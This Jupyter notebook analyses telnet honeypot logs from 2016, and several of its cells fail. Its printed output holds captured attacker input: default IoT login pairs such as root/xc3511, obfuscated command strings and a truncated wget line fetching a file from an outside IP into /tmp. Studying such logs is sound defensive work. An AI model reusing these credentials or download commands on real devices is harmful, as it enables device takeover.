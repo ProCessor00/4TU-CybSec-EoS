{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import re\n",
    "import os\n",
    "import csv\n",
    "import datetime\n",
    "import time\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import ipaddress\n",
    "import matplotlib.pyplot as plt\n",
    "plt.style.use('ggplot')\n",
    "\n",
    "%matplotlib inline\n",
    "import pylab\n",
    "pylab.rcParams['figure.figsize'] = (10, 10)\n",
    "\n",
    "import seaborn as sns\n",
    "sns.set_style('darkgrid')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {
    "collapsed": false,
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "# shows percentage-completed bar    \n",
    "def perc_write(curr_val, max_val):\n",
    "    if curr_val % int(max_val / 10) == 0:\n",
    "        print(round(curr_val / max_val * 10), end=\"\")\n",
    "        if round(curr_val / max_val * 10) == 10:\n",
    "            print(\"\")\n",
    "    elif curr_val % int(max_val / 100) == 0:            \n",
    "        print(\"-\", end=\"\")\n",
    "\n",
    "def ip2long(ip):\n",
    "    return int(ipaddress.ip_address(str(ip)))\n",
    "    \n",
    "def clean(string):\n",
    "    return string.replace(\"]\",\"\").replace(\"[\",\"\").replace(\"'\",\"\").strip()\n",
    "\n",
    "# Extracts all honeypot data\n",
    "def extract_honey(folder):\n",
    "    honey = []\n",
    "    num_cols = 7\n",
    "    print(\"Extracting honey. This will take a while..\")\n",
    "    files = os.listdir(honey_location)\n",
    "    print(\"Total number of files:\", len(files))\n",
    "    for index, filename in enumerate(files):\n",
    "        if \".\" not in filename: \n",
    "            continue\n",
    "        print(index, filename)\n",
    "        with open(honey_location + \"/\" + filename) as f:\n",
    "            for row in f:\n",
    "                row = row.split(\"$$\")\n",
    "                commands = clean(row[-1])[:300].split(\",\")\n",
    "                login = []\n",
    "                if len(commands[0]) < 20:\n",
    "                    login = commands[0:2]\n",
    "                    commands = commands[2:]\n",
    "                honey.append(row[:len(row)-1])            \n",
    "                honey[-1].append(login)          \n",
    "                honey[-1].append(commands)\n",
    "                if len(honey[-1]) > 7:\n",
    "                    num_cols = len(honey[-1])\n",
    "        print(honey[-1])\n",
    "    print(\"Done.\")\n",
    "    return honey, num_cols\n",
    "\n",
    "def honey_to_panda(honey, cols):\n",
    "    print(\"Converting honey to panda.. \", end=\"\")\n",
    "    headers = [\"Timestamp\", \"SrcIP\", \"SrcPort\", \"DstIP\", \"DstPort\", \"Login\", \"Commands\"]\n",
    "    if cols > 7:\n",
    "        headers.append(\"lol\")\n",
    "    panda = pd.DataFrame(honey, columns=headers)[[\"Timestamp\", \"SrcIP\", \"SrcPort\", \"DstIP\", \"DstPort\", \"Login\", \"Commands\"]]\n",
    "    panda['Timestamp'] = pd.to_datetime(panda['Timestamp'],format=\"%Y-%m-%d %H:%M:%S\")\n",
    "    panda['SrcIP_I'] = panda.apply(lambda row: ip2long(row['SrcIP']), axis=1)\n",
    "    panda['DstIP_I'] = panda.apply(lambda row: ip2long(row['DstIP']), axis=1)\n",
    "    panda = panda.sort_values(['Timestamp', 'SrcIP_I', 'DstIP_I'], ascending=[True,True,True])\n",
    "    print(\"Done.\")\n",
    "    return panda\n",
    "\n",
    "def store_panda(path, panda):\n",
    "    print(\"Storing panda.. \", end=\"\")\n",
    "    panda.to_csv(path, sep='\\t', encoding='utf-8')\n",
    "    print(\"Done.\")\n",
    "\n",
    "def load_panda(path):\n",
    "    print(\"Loading panda.. \", end=\"\")\n",
    "    panda = pd.DataFrame.from_csv(path, sep='\\t', encoding='utf-8')\n",
    "    print(\"Done.\")\n",
    "    return panda"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Loading panda.. Done.\n"
     ]
    }
   ],
   "source": [
    "# Import the datasets (please use the provided csv's and place this in the folder of the notebook)\n",
    "# First extract the source ip addresses from all data and store it (if not done before).\n",
    "honey_location = \"C:/Users/Rob/Downloads/two_month\"\n",
    "pandafile = \"pandified_data.csv\"\n",
    "overwrite = False\n",
    "\n",
    "if overwrite or not os.path.isfile(pandafile):\n",
    "    honey, cols = extract_honey(honey_location)\n",
    "    panda_data = honey_to_panda(honey, cols)\n",
    "    store_panda(pandafile, panda_data)\n",
    "else:\n",
    "    panda_data = load_panda(pandafile)  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {
    "collapsed": false,
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "                 Timestamp            SrcIP  SrcPort           DstIP  DstPort  \\\n",
      "40028  2016-07-01 05:42:10   85.250.215.179    51310  133.34.157.111       23   \n",
      "12092  2016-07-01 05:42:10    113.22.96.148    37268  133.34.157.114       23   \n",
      "53995  2016-07-01 05:42:10    119.87.76.235     1289  133.34.157.152       23   \n",
      "40953  2016-07-01 05:42:10    201.132.44.72    46124  133.34.157.113       23   \n",
      "11317  2016-07-01 05:42:11   79.173.253.201    46565  133.34.157.141       23   \n",
      "1424   2016-07-01 05:42:11   223.19.224.251    43532  133.34.157.122       23   \n",
      "11087  2016-07-01 05:42:12   14.182.102.111    49781   133.34.157.83       23   \n",
      "118    2016-07-01 05:42:12    62.219.98.132     1182  133.34.157.148       23   \n",
      "38881  2016-07-01 05:42:12      106.1.80.81    48173   133.34.157.92       23   \n",
      "25591  2016-07-01 05:42:12  201.206.191.114    44130  133.34.157.125       23   \n",
      "54449  2016-07-01 05:42:12  221.151.203.120    37815  133.34.157.133       23   \n",
      "14843  2016-07-01 05:42:13   14.164.107.200    37868  133.34.157.148       23   \n",
      "25807  2016-07-01 05:42:13     122.3.73.168    42276  133.34.157.125       23   \n",
      "35247  2016-07-01 05:42:14    116.100.87.38    59107  133.34.157.160       23   \n",
      "27260  2016-07-01 05:42:14    189.35.155.83    53925  133.34.157.150       23   \n",
      "659    2016-07-01 05:42:14    222.99.222.40    40493  133.34.157.151       23   \n",
      "44179  2016-07-01 05:42:15      1.34.236.67    51032  133.34.157.135       23   \n",
      "41612  2016-07-01 05:42:15    76.16.229.199    40711  133.34.157.144       23   \n",
      "810    2016-07-01 05:42:15    112.16.211.77    52160   133.34.157.96       23   \n",
      "46530  2016-07-01 05:42:15  122.116.163.112    46977  133.34.157.132       23   \n",
      "26480  2016-07-01 05:42:16     179.99.64.77    45698  133.34.157.141       23   \n",
      "6422   2016-07-01 05:42:18   95.167.189.211    43446   133.34.157.92       23   \n",
      "38448  2016-07-01 05:42:21    88.251.228.36    51493  133.34.157.103       23   \n",
      "16476  2016-07-01 05:42:27   187.170.205.85    59695  133.34.157.156       23   \n",
      "36764  2016-07-01 05:42:39     187.158.6.81    57945   133.34.157.73       23   \n",
      "21119  2016-07-01 05:42:41   190.63.185.100    36557  133.34.157.131       23   \n",
      "27080  2016-07-01 05:42:49    95.70.204.183    53777  133.34.157.116       23   \n",
      "13635  2016-07-01 05:42:51      190.59.0.69    38394   133.34.157.61       23   \n",
      "3217   2016-07-01 05:42:53  116.104.115.151    41932  133.34.157.132       23   \n",
      "13840  2016-07-01 05:42:59    177.23.234.89    47902  133.34.157.115       23   \n",
      "45743  2016-07-01 05:43:04  118.233.200.170    35626  133.34.157.110       23   \n",
      "8867   2016-07-01 05:43:14   115.177.11.215    40457  133.34.157.181       23   \n",
      "9112   2016-07-01 05:43:14   115.177.11.215    40484  133.34.157.181       23   \n",
      "12466  2016-07-01 05:43:14   115.177.11.215    40487  133.34.157.181       23   \n",
      "12602  2016-07-01 05:43:14   115.177.11.215    40441  133.34.157.181       23   \n",
      "25857  2016-07-01 05:43:14   115.177.11.215    40485  133.34.157.181       23   \n",
      "27142  2016-07-01 05:43:14   115.177.11.215    40479  133.34.157.181       23   \n",
      "32877  2016-07-01 05:43:14   115.177.11.215    40470  133.34.157.181       23   \n",
      "42688  2016-07-01 05:43:14   115.177.11.215    40477  133.34.157.181       23   \n",
      "15701  2016-07-01 05:43:15   115.177.11.215    40491  133.34.157.181       23   \n",
      "17736  2016-07-01 05:43:15   115.177.11.215    40440  133.34.157.181       23   \n",
      "29295  2016-07-01 05:43:15   115.177.11.215    40450  133.34.157.181       23   \n",
      "50755  2016-07-01 05:43:15   115.177.11.215    40493  133.34.157.181       23   \n",
      "21578  2016-07-01 05:43:15  190.165.167.234    38281  133.34.157.139       23   \n",
      "22821  2016-07-01 05:43:15   220.133.184.25    45554  133.34.157.184       23   \n",
      "2397   2016-07-01 05:43:16   115.177.11.215    40489  133.34.157.181       23   \n",
      "10120  2016-07-01 05:43:16   115.177.11.215    40496  133.34.157.181       23   \n",
      "25986  2016-07-01 05:43:16   115.177.11.215    40474  133.34.157.181       23   \n",
      "37169  2016-07-01 05:43:16   115.177.11.215    40431  133.34.157.181       23   \n",
      "42282  2016-07-01 05:43:16   115.177.11.215    40444  133.34.157.181       23   \n",
      "\n",
      "                                                   Login  \\\n",
      "40028                                     ['cat $SHELL']   \n",
      "12092                                                 []   \n",
      "53995                                  ['root', ' root']   \n",
      "40953                                   ['sh', ' shell']   \n",
      "11317                                     ['cat $SHELL']   \n",
      "1424                                                  []   \n",
      "11087  ['sh', ' UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=STu...   \n",
      "118                                                   []   \n",
      "38881                                  ['root', ' root']   \n",
      "25591                                  ['root', ' root']   \n",
      "54449                                                 []   \n",
      "14843                                  ['root', ' root']   \n",
      "25807  ['sh', ' cd /tmp || cd /var/run || cd /mnt || ...   \n",
      "35247  ['cat $SHELL', ' UDSWU(STzDwTISTu*UTIZ?=STzDwS...   \n",
      "27260                                ['root', ' xc3511']   \n",
      "659                                                   []   \n",
      "44179  ['root', ' UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=S...   \n",
      "41612                                  ['root', ' root']   \n",
      "810                                                   []   \n",
      "46530                                ['root', ' xc3511']   \n",
      "26480                                                 []   \n",
      "6422                           ['xc3511', ' cat $SHELL']   \n",
      "38448                                ['root', ' xc3511']   \n",
      "16476  ['root', ' UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=S...   \n",
      "36764                                ['root', ' xc3511']   \n",
      "21119                                  ['root', ' root']   \n",
      "27080                                ['root', ' xc3511']   \n",
      "13635                                  ['root', ' root']   \n",
      "3217                                 ['root', ' xc3511']   \n",
      "13840                                ['root', ' xc3511']   \n",
      "45743                                ['root', ' xc3511']   \n",
      "8867                                                  []   \n",
      "9112                             ['cat $SHELL', ' root']   \n",
      "12466                          ['xc3511', ' cat $SHELL']   \n",
      "12602                                                 []   \n",
      "25857                            ['cat $SHELL', ' root']   \n",
      "27142                           ['vizxv', ' cat $SHELL']   \n",
      "32877                                                 []   \n",
      "42688                                                 []   \n",
      "15701                                ['root', ' xc3511']   \n",
      "17736                                                 []   \n",
      "29295                                                 []   \n",
      "50755                          ['xc3511', ' cat $SHELL']   \n",
      "21578                                ['root', ' xc3511']   \n",
      "22821                                                 []   \n",
      "2397                                   ['root', ' root']   \n",
      "10120                                  ['root', ' root']   \n",
      "25986                                                 []   \n",
      "37169                                                 []   \n",
      "42282                                                 []   \n",
      "\n",
      "                                                Commands     SrcIP_I  \\\n",
      "40028                                                 []  1442502579   \n",
      "12092  ['cd /tmp || cd /var/run || cd /dev/shm || cd ...  1897291924   \n",
      "53995  [' sh', ' UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=ST...  2002210027   \n",
      "40953  [' enable', ' UDSWU(STzDwTISTu*UTIZ?=STzDwSddS...  3380882504   \n",
      "11317                                                 []  1336802761   \n",
      "1424   ['cd /tmp || cd /var/run || cd /dev/shm || cd ...  3742621947   \n",
      "11087  ['', 'X@>$T^B\"XxAZxAS^B\"XxAZ^vxs^!qS(zw|)zSWvS...   246834799   \n",
      "118    ['cd /tmp || cd /var/run || cd /dev/shm || cd ...  1054564996   \n",
      "38881  [' sh', ' cd /tmp || cd /var/run || cd /dev/sh...  1778470993   \n",
      "25591  [' sh', ' cd /tmp || cd /var/run || cd /dev/sh...  3385769842   \n",
      "54449  ['cd /tmp || cd /var/run || cd /dev/shm || cd ...  3717712760   \n",
      "14843  [' UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=STu*UTSdd...   245656520   \n",
      "25807                                                 []  2047035816   \n",
      "35247  ['', 'X@>$T^B\"XxAZxAS^B\"XxAZ^vxs^!qS(zw|)zSWvS...  1952732966   \n",
      "27260  [' UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=STu*UTSdd...  3173227347   \n",
      "659    ['cd /tmp || cd /var/run || cd /dev/shm || cd ...  3731086888   \n",
      "44179  ['', 'X@>$T^B\"XxAZxAS^B\"XxAZ^vxs^!qS(zw|)zSWvS...    19065923   \n",
      "41612  [' sh', ' cd /tmp || cd /var/run || cd /dev/sh...  1276175815   \n",
      "810    ['cd /tmp && wget http://210.46.85.150/.s -O s...  1880150861   \n",
      "46530                                    [' cat $SHELL']  2054464368   \n",
      "26480  ['cd /tmp || cd /var/run || cd /dev/shm || cd ...  3009626189   \n",
      "6422                                                  []  1604828627   \n",
      "38448                                    [' cat $SHELL']  1492902948   \n",
      "16476  ['', 'X@>$T^B\"XxAZxAS^B\"XxAZ^vxs^!qS(zw|)zSWvS...  3148533077   \n",
      "36764                                    [' cat $SHELL']  3147695697   \n",
      "21119  [' sh', ' cd /tmp || cd /var/run || cd /dev/sh...  3191847268   \n",
      "27080                                    [' cat $SHELL']  1598475447   \n",
      "13635  [' sh', ' cd /tmp || cd /var/run || cd /dev/sh...  3191537733   \n",
      "3217                                     [' cat $SHELL']  1953002391   \n",
      "13840                                    [' cat $SHELL']  2971134553   \n",
      "45743                                    [' cat $SHELL']  1995032746   \n",
      "8867   ['cd /tmp || cd /var/run || cd /dev/shm || cd ...  1940982743   \n",
      "9112                          [' xc3511', ' cat $SHELL']  1940982743   \n",
      "12466                [' root', ' xc3511', ' cat $SHELL']  1940982743   \n",
      "12602  ['cd /tmp || cd /var/run || cd /dev/shm || cd ...  1940982743   \n",
      "25857                         [' xc3511', ' cat $SHELL']  1940982743   \n",
      "27142                                                 []  1940982743   \n",
      "32877  ['cd /tmp || cd /var/run || cd /dev/shm || cd ...  1940982743   \n",
      "42688  ['cd /tmp || cd /var/run || cd /dev/shm || cd ...  1940982743   \n",
      "15701  [' cat $SHELL', ' root', ' xc3511', ' cat $SHE...  1940982743   \n",
      "17736  ['cd /tmp || cd /var/run || cd /dev/shm || cd ...  1940982743   \n",
      "29295  ['cd /tmp || cd /var/run || cd /dev/shm || cd ...  1940982743   \n",
      "50755  [' root', ' root', ' sh', ' cd /tmp || cd /var...  1940982743   \n",
      "21578                                    [' cat $SHELL']  3198527466   \n",
      "22821  ['cd /tmp || cd /var/run || cd /dev/shm || cd ...  3699750937   \n",
      "2397   [' sh', ' cd /tmp || cd /var/run || cd /dev/sh...  1940982743   \n",
      "10120  [' sh', ' cd /tmp || cd /var/run || cd /dev/sh...  1940982743   \n",
      "25986  ['cd /tmp || cd /var/run || cd /dev/shm || cd ...  1940982743   \n",
      "37169  ['cd /tmp || cd /var/run || cd /dev/shm || cd ...  1940982743   \n",
      "42282  ['cd /tmp || cd /var/run || cd /dev/shm || cd ...  1940982743   \n",
      "\n",
      "          DstIP_I  \n",
      "40028  2233638255  \n",
      "12092  2233638258  \n",
      "53995  2233638296  \n",
      "40953  2233638257  \n",
      "11317  2233638285  \n",
      "1424   2233638266  \n",
      "11087  2233638227  \n",
      "118    2233638292  \n",
      "38881  2233638236  \n",
      "25591  2233638269  \n",
      "54449  2233638277  \n",
      "14843  2233638292  \n",
      "25807  2233638269  \n",
      "35247  2233638304  \n",
      "27260  2233638294  \n",
      "659    2233638295  \n",
      "44179  2233638279  \n",
      "41612  2233638288  \n",
      "810    2233638240  \n",
      "46530  2233638276  \n",
      "26480  2233638285  \n",
      "6422   2233638236  \n",
      "38448  2233638247  \n",
      "16476  2233638300  \n",
      "36764  2233638217  \n",
      "21119  2233638275  \n",
      "27080  2233638260  \n",
      "13635  2233638205  \n",
      "3217   2233638276  \n",
      "13840  2233638259  \n",
      "45743  2233638254  \n",
      "8867   2233638325  \n",
      "9112   2233638325  \n",
      "12466  2233638325  \n",
      "12602  2233638325  \n",
      "25857  2233638325  \n",
      "27142  2233638325  \n",
      "32877  2233638325  \n",
      "42688  2233638325  \n",
      "15701  2233638325  \n",
      "17736  2233638325  \n",
      "29295  2233638325  \n",
      "50755  2233638325  \n",
      "21578  2233638283  \n",
      "22821  2233638328  \n",
      "2397   2233638325  \n",
      "10120  2233638325  \n",
      "25986  2233638325  \n",
      "37169  2233638325  \n",
      "42282  2233638325  \n"
     ]
    },
    {
     "ename": "NameError",
     "evalue": "name 'df' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-56-dc6d1aad9fe4>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m      3\u001b[0m \u001b[1;31m#print(\"hoi\")\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m----> 4\u001b[0;31m \u001b[0mdf_ip\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mdf\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mdf\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mSrcIP\u001b[0m \u001b[1;33m==\u001b[0m \u001b[1;34m'190.147.187.12'\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0msort_values\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;34m'DstIP'\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;34m'Timestamp'\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mascending\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;32mFalse\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;32mTrue\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      5\u001b[0m \u001b[1;31m#p = df[(df.Commands.map(len) >= 5)].sort_values(['DstIP', 'Timestamp'], ascending\"lol\"=[False,True])\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m \u001b[1;31m#print(p[\"Commands\"].iloc[0])\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mNameError\u001b[0m: name 'df' is not defined"
     ]
    }
   ],
   "source": [
    "print(panda_data.head(50))\n",
    "\n",
    "#print(\"hoi\")\n",
    "df_ip = df[(df.SrcIP == '190.147.187.12')].sort_values(['DstIP', 'Timestamp'], ascending=[False,True])\n",
    "#p = df[(df.Commands.map(len) >= 5)].sort_values(['DstIP', 'Timestamp'], ascending\"lol\"=[False,True])\n",
    "#print(p[\"Commands\"].iloc[0])\n",
    "#df[('61.245.160.0' < df.ip) & (df.ip < '61.245.175.255')]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "#print(\"hoi\")\n",
    "ipp = '115.177.11.215'\n",
    "\n",
    "def write_srcip_data(panda_data, srcip, text):\n",
    "    df_ip = df[(df.SrcIP == srcip)].sort_values(['DstIP', 'Timestamp'], ascending=[True,True])\n",
    "    if not os.path.isfile(\"/generated\"):\n",
    "        os.mkdir(\"/generated\")\n",
    "    df_ip.to_csv(honey_location + \"/generated/honeypot_data_\"+ srcip + \"_\" + str(text) +\".csv\", sep='\\t', encoding='utf-8')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "ip = \"192.227.130.234\"\n",
    "\n",
    "def get_country(srcip):\n",
    "    url = 'http://ip-api.com/json/' + srcip\n",
    "    response = requests.get(url)\n",
    "    return response.json()['country']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'df' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-8-4f97bfea5f83>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[1;31m# Calulates actual counts of top 10 ips\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0mreal_counts\u001b[0m \u001b[1;33m=\u001b[0m \u001b[1;33m{\u001b[0m\u001b[1;33m}\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m----> 3\u001b[0;31m \u001b[1;32mfor\u001b[0m \u001b[0mi\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mip\u001b[0m \u001b[1;32min\u001b[0m \u001b[0menumerate\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mdf\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;34m'SrcIP'\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      4\u001b[0m     \u001b[1;32mif\u001b[0m \u001b[0mip\u001b[0m \u001b[1;32min\u001b[0m \u001b[0mreal_counts\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m         \u001b[0mreal_counts\u001b[0m\u001b[1;33m[\u001b[0m\u001b[0mip\u001b[0m\u001b[1;33m]\u001b[0m \u001b[1;33m+=\u001b[0m \u001b[1;36m1\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mNameError\u001b[0m: name 'df' is not defined"
     ]
    }
   ],
   "source": [
    "# Calulates actual counts of top 10 ips\n",
    "real_counts = {}\n",
    "for i, ip in enumerate(df['SrcIP']):\n",
    "    if ip in real_counts:\n",
    "        real_counts[ip] += 1\n",
    "    else:\n",
    "        real_counts[ip] = 1\n",
    "    perc_write(i, len(ip_data))\n",
    "\n",
    "# show results\n",
    "countries = []\n",
    "for index, (ip, count) in enumerate(sorted(list(real_counts.items()),key=lambda x: x[1], reverse=True)[:10]):\n",
    "    countries.append(get_country(ip))\n",
    "    print(index, \"\\t\", count, \"\\t\", ip, \"\\t\\t\", countries[-1])\n",
    "    write_srcip_data(ip, index)\n",
    "print(\"\")\n",
    "\n",
    "# show the variance contribution of all PCs.\n",
    "plt.rcParams[\"figure.figsize\"] = (7,7)\n",
    "plt.title(\"Konijn\")\n",
    "plt.ylabel('Percentage explained')\n",
    "plt.xlabel('Number of PCs used')\n",
    "y = [0]\n",
    "y.extend(countries)\n",
    "plt.plot(range(0,len(y)), y, marker='o', color='blue')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 162,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x170210fff98>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "objects = ('Python', 'C++', 'Java', 'Perl', 'Scala', 'Lisp')\n",
    "y_pos = np.arange(len(objects))\n",
    "performance = [10,8,6,4,2,1]\n",
    " \n",
    "plt.bar(y_pos, performance, align='center', alpha=0.5)\n",
    "plt.xticks(y_pos, objects)\n",
    "plt.ylabel('Usage')\n",
    "plt.title('Programming language usage')\n",
    " \n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def login_successful(data):\n",
    "    return data['Commands'].apply(lambda x: x=='Attack')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['2016-07-05 06:20:16', '77.28.79.246', '8807', '133.34.157.104', '23', ['root', 'root'], ['sh', 'shell', 'enable', 'UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=STu*UTSddS?=ST=)uTxADZ^vxs^!qSr|)zSAzzw1TT+@X@@@X', '', 'X@>$T^B\"XxAZxAS^B\"XxAZ^vxs^!qS(zw|)zSWvS*\"!\"sD!vxSWwS*\"!\"sD!vxS+@X@@@X', '', 'X@>$S^B\"@XxAS^B\"@XxAZxAS^B\"@XxAZ^vxs^!qSz(zwSWUS^B\"oXxASW|S+@X@@@X', '', 'X@>$ZxAS^B\"oXxA', 'UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=STu*UTSddS?=ST=)uTxADZ^vxs^!qSr|)zSAzzw1TT+@X@@@X', '', 'X@>$T^B\"XxAZxAS^B\"XxAZ^vxs^!qS(zw|)zSWvS*\"!\"sD!vxSWwS*\"!\"sD!vxS+@X@@@X', '', 'X@>$S^B\"@XxAS^B\"@XxAZxAS^B\"@XxAZ^vxs^!qSz(zwSWUS^B\"oXxASW|S+@X@@@X', '', 'X@>$ZxAS^B\"oXxA', 'UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=STu*UTSddS?=ST=)uTxADZ^vxs^!qSr|)zSAzzw1TT+@X@@@X', '', 'X@>$T^B\"XxAZxAS^B\"XxAZ^vxs^!qS(zw|)zSWvS*\"!\"sD!vxSWwS*\"!\"sD!vxS+@X@@@X', '', 'X@>$S^B\"@XxAS^B\"@XxAZxAS^B\"@XxAZ^vxs^!qSz(zwSWUS^B\"oXxASW|S+@X@@@X', '', 'X@>$ZxAS^B\"oXxA', 'UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=STu*UTSddS?=ST=)uTxADZ^vxs^!qSr|)zSAzzw1TT+@X@@@X', '', 'X@>$T^B\"XxAZxAS^B\"XxAZ^vxs^!qS(zw|)zSWvS*\"!\"sD!vxSWwS*\"!\"sD!vxS+@X@@@X', '', 'X@>$S^B\"@XxAS^B\"@XxAZxAS^B\"@XxAZ^vxs^!qSz(zwSWUS^B\"oXxASW|S+@X@@@X', '', 'X@>$ZxAS^B\"oXxA', 'UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=STu*UTSddS?=ST=)uTxADZ^vxs^!qSr|)zSAzzw1TT+@X@@@X', '', 'X@>$T^B\"XxAZxAS^B\"XxAZ^vxs^!qS(zw|)zSWvS*\"!\"sD!vxSWwS*\"!\"sD!vxS+@X@@@X', '', 'X@>$S^B\"@XxAS^B\"@XxAZxAS^B\"@XxAZ^vxs^!qSz(zwSWUS^B\"oXxASW|S+@X@@@X', '', 'X@>$ZxAS^B\"oXxA', 'UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=STu*UTSddS?=ST=)uTxADZ^vxs^!qSr|)zSAzzw1TT+@X@@@X', '', 'X@>$T^B\"XxAZxAS^B\"XxAZ^vxs^!qS(zw|)zSWvS*\"!\"sD!vxSWwS*\"!\"sD!vxS+@X@@@X', '', 'X@>$S^B\"@XxAS^B\"@XxAZxAS^B\"@XxAZ^vxs^!qSz(zwSWUS^B\"oXxASW|S+@X@@@X', '', 'X@>$ZxAS^B\"oXxA', 'UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=STu*UTSddS?=ST=)uTxADZ^vxs^!qSr|)zSAzzw1TT+@X@@@X', '', 'X@>$T^B\"XxAZxAS^B\"XxAZ^vxs^!qS(zw|)zSWvS*\"!\"sD!vxSWwS*\"!\"sD!vxS+@X@@@X', '', 'X@>$S^B\"@XxAS^B\"@XxAZxAS^B\"@XxAZ^vxs^!qSz(zwSWUS^B\"oXxASW|S+@X@@@X', '', 'X@>$ZxAS^B\"oXxA', 'UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=STu*UTSddS?=ST=)uTxADZ^vxs^!qSr|)zSAzzw1TT+@X@@@X', '', 'X@>$T^B\"XxAZxAS^B\"XxAZ^vxs^!qS(zw|)zSWvS*\"!\"sD!vxSWwS*\"!\"sD!vxS+@X@@@X', '', 'X@>$S^B\"@XxAS^B\"@XxAZxAS^B\"@XxAZ^vxs^!qSz(zwSWUS^B\"oXxASW|S+@X@@@X', '', 'X@>$ZxAS^B\"oXxA', 'UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=STu*UTSddS?=ST=)uTxADZ^vxs^!qSr|)zSAzzw1TT+@X@@@X', '', 'X@>$T^B\"XxAZxAS^B\"XxAZ^vxs^!qS(zw|)zSWvS*\"!\"sD!vxSWwS*\"!\"sD!vxS+@X@@@X', '', 'X@>$S^B\"@XxAS^B\"@XxAZxAS^B\"@XxAZ^vxs^!qSz(zwSWUS^B\"oXxASW|S+@X@@@X', '', 'X@>$ZxAS^B\"oXxA', 'UDSWU(STzDwTISTu*UTIZ?=STzDwSddS?=STu*UTSddS?=ST=)uTxADZ^vxs^!qSr|)zSAzzw1TT+@X@@@X', '', 